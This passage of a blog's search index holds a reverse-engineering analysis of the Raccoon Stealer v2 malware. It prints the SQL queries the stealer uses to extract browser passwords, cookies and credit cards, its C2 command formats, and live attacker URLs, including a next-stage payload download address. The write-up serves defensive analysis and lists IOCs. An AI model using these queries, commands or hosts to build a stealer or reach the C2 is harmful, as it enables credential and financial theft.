URL:%s\\nUSR:%s\\nPASS:%s\\n \\t\\t%d) %s\\n \\t- Locale: %s\\n \\t- OS: %s\\n \\t- RAM: %d MB\\n \\t- Time zone: %c%ld minutes from GMT\\n \\t- Display size: %dx%d\\n \\t- Architecture: x%d\\n \\t- CPU: %s (%d cores)\\n \\t- Display Devices:\\n%s\\n formhistory.sqlite logins.json \\\\autofill.txt \\\\cookies.txt \\\\passwords.txt Content-Type: application/x-www-form-urlencoded; charset=utf-8 Content-Type: multipart/form-data; boundary= Content-Type: text/plain; User Data wallets wlts_ ldr_ scrnsht_ sstmnfo_ token: nss3.dll sqlite3.dll SOFTWARE\\\\Microsoft\\\\Windows NT\\\\CurrentVersion PATH ProductName Web Data sqlite3_prepare_v2 sqlite3_open16 sqlite3_close sqlite3_step sqlite3_finalize sqlite3_column_text16 sqlite3_column_bytes16 sqlite3_column_blob SELECT origin_url, username_value, password_value FROM logins SELECT host_key, path, is_secure , expires_utc, name, encrypted_value FROM cookies SELECT name, value FROM autofill pera Stable SELECT host, path, isSecure, expiry, name, value FROM moz_cookies SELECT fieldname, value FROM moz_formhistory cookies.sqlite machineId= \u0026configId= \"encrypted_key\":\" stats_version\":\" Content-Type: application/x-object Content-Disposition: form-data; name=\"file\"; filename=\" POST MachineGuid image/jpeg GdiPlus.dll Gdi32.dll GdiplusStartup GdipDisposeImage GdipGetImageEncoders GdipGetImageEncodersSize GdipCreateBitmapFromHBITMAP GdipSaveImageToFile BitBlt CreateCompatibleBitmap CreateCompatibleDC DeleteObject GetObjectW SelectObject SetStretchBltMode StretchBlt SELECT name_on_card, card_number_encrypted, expiration_month, expiration_year FROM credit_cards NUM:%s\\nHOLDER:%s\\nEXP:%s/%s\\n \\\\CC.txt NSS_Init NSS_Shutdown PK11_GetInternalKeySlot PK11_FreeSlot PK11_Authenticate PK11SDR_Decrypt SECITEM_FreeItem hostname\":\" \",\"httpRealm\": encryptedUsername\":\" \",\"encryptedPassword\":\" \",\"guid\": Profiles b\"\\xee\\xefV\u003e\\x0c\\xb5Ge\\xb6,A\\xef\\x87=g)'\\x99\\x0c\\xbf7iT\\xfd\" b'Ti\\x8d\\xc8\\xf7:\\xdc\\x9f\\xeb\\xff\\xdc\\xef\\xb1\\x154\\xb4*\\x00\\x87\\xd9\\xf0q' as we can see, the last two strings seems not to be decrypted. If we go back the start function we see that the string 59c9737264c0b3209d9193b8ded6c127 is a different key used to decrypt the string XVHmGYV5cH1pvOC0w/cmantl/oG9aw== and the decrypted string is http://51.195.166.184/ there are some other decryption routines using the same key but the strings are empty. then, the attacker retrieves the locale name which is \u003clanguage\u003e-\u003cREGION\u003e and compare it against ru for some reason, but the flow didn’t changed if it is! The attacker open a mutex with a name 8724643052 and if it existed, the malware terminate itself and if it is not existed it creates a mutex with that name. ","date":"2022-09-12","objectID":"/raccoon-stealer/:2:3","tags":["Malware Analysis","Reverse Engineering"],"title":"Raccoon Stealer","uri":"/raccoon-stealer/"},{"categories":["Malware Analysis"],"content":"Alert the server with a new victim Info The next call is to check if the victim running as local system by making a call to GetTokenInformation to retrieve the token user data that include SID and then check this SID with S-1-5-18 to see if the user is running as a LocalSystem or not. If it is, the function returns 1 and not returns 0 The next few instruction retrieves a decrypted strings: Content-Type: application/x-www-form-urlencoded; charset=utf-8 and */* then calls a function that formats the input with a given pattern, This function is referenced in a lot of places in the sample. this function format the input string with \\r\\n appended to it and calls the function that seems to be that does the formatting procedures and it’s used in so many places Then the malware make a call to a function sub_0040A720 after allocating two regions in the memory .if we navigate to this function we see that it first reference the previously allocated memory and the open the registry key HKEY_LOCAL_MACHINE\\SOFTWARE\\Microsoft\\Cryptography\\ and read the value MachineGuid and returns it in EAX register then the malware retrieves the username of the current user and makes some formatting to the data before sending it. The formatted data are some information about the victim machine like: machineId=\u003cGUID\u003e|\u003cusername\u003e\u0026confId=\u003cpredefined value\u003e machineId=d8874349-72d5-492c-8d8c-5e6d3a68e127|d01a\u0026configId=59c9737264c0b3209d9193b8ded6c127 configId used is the key used to decrypt the C2 IP address . Now, the first piece of data is ready to be sent to the attacker and the function sub_004079F3 did this. First, the function references the IP of the C2 server and make some comparisons to its beginning to make sure that it’s in a valid format. Then it gets a pointer to / at the end of the IP address and then make a call to InternetOpenW(\"record\",0,0,0) it parameter is the User-Agent of the request sent .now it’s ready to connect to the remote server, so it connects to the remote server over http transfer protocol and port 443, the default for https transfer protocol Then it sends the data to the C2 server set before. The content type sent in the request in the form Content-Type: application/x-www-form-urlencoded; charset=utf-8\\r\\n\\r\\n\\r\\n and the data sent in the OptionalHeader parameter which sent after the request headers. And after sending the data it waits for a response from the server. Then it parses the response for a specific field contain the word Token: if it found it continue running if it is not, it exits. ","date":"2022-09-12","objectID":"/raccoon-stealer/:2:4","tags":["Malware Analysis","Reverse Engineering"],"title":"Raccoon Stealer","uri":"/raccoon-stealer/"},{"categories":["Malware Analysis"],"content":"Install required libraries It search for the libs word in the response in order to prepare a legitimate DLL that are required for the malware to run. the command can be in form: libs_nss3:http://{HOSTADDR}/{RANDOM_STRING}/nss3.dll libs_msvcp140:http://{HOSTADDR}/{RANDOM_STRING}/msvcp140.dll libs_vcruntime140:http://{HOSTADDR}/{RANDOM_STRING}/vcruntime140.dll ","date":"2022-09-12","objectID":"/raccoon-stealer/:2:5","tags":["Malware Analysis","Reverse Engineering"],"title":"Raccoon Stealer","uri":"/raccoon-stealer/"},{"categories":["Malware Analysis"],"content":"Get victim machine information Then, It retrieves the path of Local AppData C:\\Users\\d01a\\AppData\\Local by calling SHGetFolderPathW from the function sub_0040A323 and format it by adding the word Low at the end of the path then it adds the path to sqlite3.dll and other downloaded DLLs to the PATH environment variables The malware collects information about the system through the function call a sub_004097BB , it search for the word sstmnfo_ in the response of the C2 Server and the data to be collected is determined in the response, after a colon : and a pipe | between the key words of the data. Then, it begin collecting information about the system: The locale information the data is formatted in the following format - Locale: Time zone information the data is formatted in the form: - Time zone: \u003c%c%ld\u003e minutes from GMT OS Version retrieves the OS version by reading the registry key SOFTWARE\\Microsoft\\Windows NT\\CurrentVersion\\ProductName and the data formatted in the form: - OS: \u003c%s OS\u003e system Architecture By calling GetSystemWow64DirectoryW that retrieves the path of of the system directory used by WOW64 that only exist in x64 Architecture. The data formated in form: - Architecture: x\u003c%d Architecture\u003e RAM status gets the memory status by calling GlobalMemoryStatusEx that retrieves both the virtual and physical memory usage and format in the form: - RAM: \u003c%d RAM Usage\u003e MB CPU specifications Using instruction cpuid to retrieve the processor specification. This instruction output depends on the value in the eax register. The call to cpuid with eax = 0x80000002 , 0x80000003 and 0x80000004 gets Processor Brand String .Also it uses GetSystemInfo API to get the number of processors. And send it in the format: - CPU: \u003c%s CPU Brand\u003e (\u003c%d Cores number\u003e cores) Display Get the display information by calling GetSystemMetrics with index 0 to retrieves The width of the screen of the primary display monitor and format it in form: - Display size: \u003c%d\u003ex\u003c%d\u003e Display devices - Display Devices: \u003c%s\u003e Display Name And version Get this information from the registry SOFTWARE\\Microsoft\\Windows\\CurrentVersion\\Uninstall And the Specific GUID to get the display name and version Then it generate a random value and append it to the content-Type header and save the data to a file to send it to the attacker C2 server That’s all with sstmnfo_ expected functionality. Lets explore the rest of the capabilities of the malware. ","date":"2022-09-12","objectID":"/raccoon-stealer/:2:6","tags":["Malware Analysis","Reverse Engineering"],"title":"Raccoon Stealer","uri":"/raccoon-stealer/"},{"categories":["Malware Analysis"],"content":"Steal User information saved in Browser Chrome Based The malware then Loads sqlite3.dll and call the function at sub_00403FAB. This function is basically allocates two regions of memory and get the paths of %AppData% and %LocalAppData% directories and then transfer the flow to another functions lets explore the first function call sub_401B13. It recursively search for User Data directory and then goes to sub_401E26 that have all the functionality. It first start looking for Local State file and reads it and search for \"encrypted_key\":\" in it and in the same way, it did with stats_version\":\" . Then, It starts to resolve some functions from sqlite3.dll to use them. And get the path to Login Data file and copies it to another file. It opens a new database connection to Login Data copied file with sqlite3_open function call then it execute SQL statement: SELECT origin_url, username_value, password_value FROM logins to steal the saved username \u0026 password and its associated origin URL Actually, To execute that SQL statement, sqlite3_step should be called. the return value of sqlite3_step can be different so, it checks if the return value is 100 this means that there is another row of output is available. To retrieve the content of the database a call to sqlite3_column_bytes16 that returns the size of the data and sqlite3_column_text16 to the content as plain text After collecting these data it format it in the following form in a file \\passwords.txt to send it: URL:%s USR:%s PASS:%s In the same way, It get the cookies using the SQL statment: SELECT host_key, path, is_secure , expires_utc, name, encrypted_value FROM cookies and format it in the following form in a file \\cookies.txt to send it: %s TRUE %s %s %s %s %s It gets the autofill content name and value pairs in the same way using the SQL query SELECT name, value FROM autofill and saved the data to a file \\autofill.txt to send it. then, it reads the content of Web Data file to extract Credit Card information using the SQL query: SELECT name_on_card, card_number_encrypted, expiration_month, expiration_year FROM credit_cards and format in the following form in a file \\CC.txt to send it: NUM:%s HOLDER:%s EXP:%s/%s and it did the whole thing with the files in Default path for the browser FireFox FireFox Browsers are a little bit different so, it collects the data from it but needs to do different steps. First it goes to Profiles and search for cookies.sqlite and it opens it using sqlite3 and get the cookies using SQL query: SELECT host, path, isSecure, expiry, name, value FROM moz_cookies then, The login information from logins.json and dumping the passwords using PK11SDR_Decrypt function call. Then, it goes to formhistory.sqlite to get the Autofill information using SQL query: SELECT fieldname, value FROM moz_formhistory ","date":"2022-09-12","objectID":"/raccoon-stealer/:2:7","tags":["Malware Analysis","Reverse Engineering"],"title":"Raccoon Stealer","uri":"/raccoon-stealer/"},{"categories":["Malware Analysis"],"content":"Steal Crypto wallets information If the response has the word wlts_ then, the malware tries to collect all crypto wallets information from the victim. Basically it navigate all the file system searching for a pattern. And in the same way, It navigate the whole system searching for wallet.dat which is a bitcoin wallet. and if it found, sends it to the server. Response be like: wlts_exodus:Exodus;26;exodus;*;*partitio*,*cache*,*dictionar* wlts_atomic:Atomic;26;atomic;*;*cache*,*IndexedDB* wlts_jaxxl:JaxxLiberty;26;com.liberty.jaxx;*;*cache* ","date":"2022-09-12","objectID":"/raccoon-stealer/:2:8","tags":["Malware Analysis","Reverse Engineering"],"title":"Raccoon Stealer","uri":"/raccoon-stealer/"},{"categories":["Malware Analysis"],"content":"grabbing Files If the response has the word grbr_ search for the specified file in the system and upload it to the attacker. the response be like: grbr_dekstop:%USERPROFILE%\\Desktop\\|*.txt, *.doc, *pdf*|-|5|1|0|files grbr_documents:%USERPROFILE%\\Documents\\|*.txt, *.doc, *pdf*|-|5|1|0|files grbr_downloads:%USERPROFILE%\\Downloads\\|*.txt, *.doc, *pdf*|-|5|1|0|files ","date":"2022-09-12","objectID":"/raccoon-stealer/:2:9","tags":["Malware Analysis","Reverse Engineering"],"title":"Raccoon Stealer","uri":"/raccoon-stealer/"},{"categories":["Malware Analysis"],"content":"Telegram connection The malware can collect Telegram Desktop application data if the response has the word tlgrm_. tlgrm_Telegram:Telegram Desktop\\tdata|*|*emoji*,*user_data*,*tdummy*,*dumps* It search for a file specified in the response from the server and navigate to it and copy it to send to the attacker. ","date":"2022-09-12","objectID":"/raccoon-stealer/:2:10","tags":["Malware Analysis","Reverse Engineering"],"title":"Raccoon Stealer","uri":"/raccoon-stealer/"},{"categories":["Malware Analysis"],"content":"Take screenshot To take a screenshot the response should have the word scrnsht_. First, It resolves APIs from GdiPlus.dll and Gdi32.dll to take a screenshot. All APIs resolved: GdiplusStartup GdipDisposeImage GdipGetImageEncoders GdipGetImageEncodersSize GdipCreateBitmapFromHBITMAP GdipSaveImageToFile BitBlt CreateCompatibleBitmap CreateCompatibleDC DeleteObject GetObjectW SelectObject SetStretchBltMode StretchBlt DC The malware uses these APIs to take a screenshots from the victim system and send them to the attacker ","date":"2022-09-12","objectID":"/raccoon-stealer/:2:11","tags":["Malware Analysis","Reverse Engineering"],"title":"Raccoon Stealer","uri":"/raccoon-stealer/"},{"categories":["Malware Analysis"],"content":"Loading Next stage The malware can drop a next stage malware specified in the response from the server containing ldr_. ldr_1:http://94.158.244.119/U4N9B5X5F5K2A0L4L4T5/84897964387342609301.bin|%TEMP%\\|exe The malware open a connection to the server and download the content of the file specified in the response to the system The malware then execute the downloaded file using ShellExecute API call That’s all, The malware clear the files that created and release the allocated memory regions ","date":"2022-09-12","objectID":"/raccoon-stealer/:2:12","tags":["Malware Analysis","Reverse Engineering"],"title":"Raccoon Stealer","uri":"/raccoon-stealer/"},{"categories":["Malware Analysis"],"content":"IOCs: sha256: 022432f770bf0e7c5260100fcde2ec7c49f68716751fd7d8b9e113bf06167e03 51.195.166[.]184 ","date":"2022-09-12","objectID":"/raccoon-stealer/:3:0","tags":["Malware Analysis","Reverse Engineering"],"title":"Raccoon Stealer","uri":"/raccoon-stealer/"},{"categories":["Malware Analysis"],"content":"References https://any.run/cybersecurity-blog/raccoon-stealer-v2-malware-analysis/ https://bazaar.abuse.ch/sample/022432f770bf0e7c5260100fcde2ec7c49f68716751fd7d8b9e113bf06167e03/ https://blog.sekoia.io/raccoon-stealer-v2-part-2-in-depth-analysis/ https://www.sqlite.org/c3ref/funclist.html https://www.sqlite.org/rescode.html ","date":"2022-09-12","objectID":"/raccoon-stealer/:4:0","tags":["Malware Analysis","Reverse Engineering"],"title":"Raccoon Stealer","uri":"/raccoon-stealer/"},{"categories":null,"content":"About me","date":"2023-01-16","objectID":"/about/","tags":null,"title":"About Me","uri":"/about/"},{"categories":null,"content":"About Me Mohamed Adel is my name, I’m a malware analyst, reverse engineer, and DFIR investigator. If you’re into pulling apart malicious code and connecting the dots in a cyber incident, you’ve come to the right place. This blog is where I share what I’m working on and what I’m learning in this world. ","date":"2023-01-16","objectID":"/about/:0:1","tags":null,"title":"About Me","uri":"/about/"},{"categories":null,"content":"Find Me  Github  LinkedIn  Twitter ","date":"2023-01-16","objectID":"/about/:0:2","tags":null,"title":"About Me","uri":"/about/"}]